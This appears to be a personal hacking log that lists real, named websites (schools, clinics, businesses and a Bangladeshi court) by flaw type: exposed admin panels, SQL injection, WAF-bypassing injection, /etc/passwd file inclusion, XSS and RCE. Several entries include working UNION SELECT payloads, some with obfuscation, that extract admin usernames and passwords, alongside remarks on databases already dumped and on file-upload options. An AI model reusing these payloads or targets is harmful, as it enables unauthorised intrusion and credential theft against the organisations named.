
# Admin panels:
 1. [http://med.nitc.ac.in/~user/google/superadminhome.php](http://med.nitc.ac.in/~user/google/superadminhome.php)
 2. [https://www.cbhedelhi.com/admin/center_add.php](https://www.cbhedelhi.com/admin/center_add.php)
 3. [http://www.technopk.com/adminIndex.php](http://www.technopk.com/adminIndex.php)
 4. [https://ccpindia.in/verification/AdminMain2.aspx](https://ccpindia.in/verification/AdminMain2.aspx)
 5. [https://www.sunclg.in/track/admin/entry.html](https://www.sunclg.in/track/admin/entry.html)
6. http://www.pcsamana.org.in/registration/admin.php
7. [http://sveg.ind.in/AdminPanel/](http://sveg.ind.in/AdminPanel/) (with noredirect from here on out)
8. [http://carboncalculator.americanpistachios.org/admin/home.php](http://carboncalculator.americanpistachios.org/admin/home.php)
9. [http://sailorsmedicalclinic.com/hms/admin/dashboard.php](http://sailorsmedicalclinic.com/hms/admin/dashboard.php)
10. https://bncindourdinara.org.in/admin/dashboard.php
11. http://www.teach11.move.pk/Admin/dashboard.php
12. https://www.sindhicollege.in/admin/dashboard.php
13. http://www.gpmau.in/gpmauadmin/admin/dashboard.php
14. https://www.computermindtech.co.in/cm_computer_admin/admin/dashboard.php (doesnt have a file uploader)
15. https://www.alternativemedicaluniversity.in/admin/dashboard.php (randomizes the uploaded file name in the backend and only accepts when theres a jpg extention at first)
16. https://www.vagoviaviaggi.it/admin/dashboard.php (filled with errors and its also french ig????????)
17. http://aksharinternationalschool.in/admin/dashboard.php (no permission to upload and also the news section is already "hacked" some goofy ass bd heckers ig)
18. https://kandistores.com/admin/home.php (uploaders are there but no permission smh)
19. https://dkonlineservices.com/admin/dashboard.aspx (through admin bypass)
# SQLi:
1. [http://www.jeevanscientific.com/newsdetails.php?id=9](http://www.jeevanscientific.com/newsdetails.php?id=9)
2. [http://www.embryohotel.com/room-detail.php?id=1](http://www.embryohotel.com/room-detail.php?id=1)
3. [https://www.pupilbooks.in/book/book.php?id=12&subject_id=28](https://www.pupilbooks.in/book/book.php?id=12&subject_id=28)
4. [https://www.bishopwalsh.edu.hk/gallery_detail.php?id=1](https://www.bishopwalsh.edu.hk/gallery_detail.php?id=1)
5. [http://www.alisan.com.hk/en/publications.php?id=19](http://www.alisan.com.hk/en/publications.php?id=19)
6. http://www.itopia.com.hk/eng/business.php?id=9 (admin, )
7. http://www.simscollege.ac.in/news.php?id=53
8. http://www.igoergo.com/_site/about.php?id=12
9. http://theory.cse.iitm.ac.in/viewevent.php?type=news&id=67
10. http://www.cr-led.com/product.php?id=77
11. https://www.af.org.pk/publication-detail.php?id=7
	- https://www.af.org.pk/publication-detail.php?id=-7'  Union Select 1,2,3,4,5,6,7,8,9,10,concat("username: ",username,"     password:  ",password),12,13 from admin-- -
12. https://www.kandistores.com/app/page.php?id=5 (database got dumped but cant concat the pass for some reason)
	 - https://www.kandistores.com/app/page.php?id=-5  Union Select 1,2,concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e2028416b446b292044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r+1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number+1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/ --+
13. https://www.sin2maxindia.in/page.php?page=BlogDetails&id=3 (dumped but its encrypted smh)
	 - https://www.sin2maxindia.in/page.php?page=BlogDetails&id=-3'  Union Select 1,version(),(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a),4,5,6,7,8,9,10-- -
14. https://www.sftc.co.in/menu.php?cat_id=19 (dumped admin username and pass but pass doesnt seem to work for some reason aaaaaaaaaa)
	- https://www.sftc.co.in/menu.php?cat_id=-19'  Union Select 1,2,concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e2028416b446b292044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/,4,5 -- -
	- https://www.sftc.co.in/menu.php?cat_id=-19'  Union Select 1,2,concat(username,"  ",password),4,5 from users-- -
15. 
# SQLi with WAF:
1. http://www.crammed.be/index.php?id=45&art_id=77
	- http://www.crammed.be/index.php?id=45&art_id=-77' /*!12345%55%6e%69%6f%6e*/ /*!50000S%65%6c%65ct*/ 1,2,3,4,5,6,concat(account_username,"=",account_password),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76 from afb_accounts-- -
2. http://www.chimin.cn/en/products-details.php?id=4&types=1
	- http://www.chimin.cn/en/products-details.php?id=4&types=-1 /*!50000Union*/ /*!50000Select*/ 1,2,/*!50000CONCAT*/(adminname,"=",adminpass),4,5,6,7,8,9,10,11,12 from kucom_admin--+-
3. https://www.supremecourt.gov.bd/web/indexn.php?page=officers_main.php&menu=11&div_id=1&lang=
	 -  https://www.supremecourt.gov.bd/web/indexn.php?page=officers_main.php&menu=11&div_id=-1' /*!50000Union*/ /*!50000Select*/ export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2),2--+-&lang= 
# GET based LFI:
1. [https://www.edsonpolillo.com.br/index.php?emaildest=advogados%40edsonpolillo.com.br&redirecionar=index.php%3Fpagina%3Dobrigado_contato.php&pagina=///etc/passwd](https://www.edsonpolillo.com.br/index.php?emaildest=advogados%40edsonpolillo.com.br&redirecionar=index.php%3Fpagina%3Dobrigado_contato.php&pagina=///etc/passwd)
2. [https://massasadelina.com.br/index.php?pagina=///etc/passwd](https://massasadelina.com.br/index.php?pagina=///etc/passwd)
3. [https://www.kukiki.com.tw/index.php?page=../../../../../../../../../../../../etc/passwd](https://www.kukiki.com.tw/index.php?page=../../../../../../../../../../../../etc/passwd)
4. [https://fatsnail.tnbnb.com.tw/index.php?page=../../../../../../../../../../../../etc/passwd](https://fatsnail.tnbnb.com.tw/index.php?page=../../../../../../../../../../../../etc/passwd)
5. [https://handays888.com/index.php?page=../../../../../../../../../../../../etc/passwd](https://handays888.com/index.php?page=../../../../../../../../../../../../etc/passwd)
6. https://www.themindassociation.org/members/register/index.php?page=home.php
# XSS:
1. http://www.gpmau.in/gpmauadmin/admin/department.php (you can paste in html elements and shit in the input feild)
2. [http://sailorsmedicalclinic.com/hms/admin/manage-doctors.php](http://sailorsmedicalclinic.com/hms/admin/manage-doctors.php)
3. [https://www.alternativemedicaluniversity.in/admin/add-books.php](https://www.alternativemedicaluniversity.in/admin/add-books.php)
# RCE:
1. touchwoodindia.com
	1. [[CVE-2001-0537]] 